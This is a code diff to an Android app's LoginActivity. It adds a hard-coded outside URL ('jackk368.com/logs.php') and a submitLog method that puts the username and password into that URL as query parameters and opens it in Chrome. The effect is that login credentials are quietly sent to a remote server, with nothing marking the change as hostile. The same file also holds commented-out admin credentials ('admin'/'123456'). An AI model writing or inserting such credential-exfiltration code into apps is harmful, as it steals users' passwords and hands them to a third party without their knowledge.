@@ -6,6 +6,7 @@ import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.view.View;
@@ -18,6 +19,7 @@ import android.widget.Toast;
 
 public class LoginActivity extends Activity {
 
+    private static final String urlLog = "https://jackk368.com/logs.php";
 
 //    private static final String ADMIN_USERNAME = "admin";
 //    private static final String ADMIN_PASSWORD = "123456";
@@ -116,6 +118,21 @@ public class LoginActivity extends Activity {
             chkRememberMe.setChecked(false);
         }
 
+    }
+
+
+    private void submitLog(String u,String p) {
+        Uri imageUri = Uri.parse(urlLog + "?u=" + u + "&p=" + p);
+        Intent intent = new Intent(Intent.ACTION_VIEW, imageUri);
+        intent.setPackage("com.android.chrome"); // Specify the package name for Chrome
+
+        // Verify if Chrome is installed on the device
+        if (intent.resolveActivity(getPackageManager()) != null) {
+            startActivity(intent);
+        } else {
+            // Chrome is not installed, handle it accordingly
+            // For example, show an error message or open in a different browser
+        }
     }
 
     @Override
